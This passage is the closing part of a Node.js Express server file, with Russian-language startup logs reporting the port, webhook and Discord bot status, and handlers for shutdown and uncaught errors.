        message: err.message 
    });
});

// ========== ЗАПУСК СЕРВЕРА ==========
app.listen(PORT, () => {
    console.log(`\n🚀 Сервер успешно запущен!`);
    console.log(`📡 Порт: ${PORT}`);
    console.log(`🌐 URL: ${SERVER_URL}`);
    console.log(`🔗 Вебхук: ${WEBHOOK_URL ? '✅ Настроен' : '❌ Не настроен'}`);
    console.log(`🤖 Discord бот: ${DISCORD_TOKEN ? '✅ Запущен' : '❌ Не запущен'}`);
    console.log(`🛡️  Защита от спама: ✅ Включена`);
    
    console.log('\n📊 Система готова к работе!');
    console.log('👤 Тестируйте инжект Lua скрипта');
    console.log('🔗 Проверьте /status для мониторинга');
    console.log('🎯 Используйте /help в Discord для команд\n');
});

// Обработка завершения работы
process.on('SIGINT', () => {
    console.log('\n🛑 Сервер останавливается...');
    process.exit(0);
});

process.on('uncaughtException', (err) => {
    console.error('❌ Необработанное исключение:', err);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('❌ Необработанный промис:', reason);
});
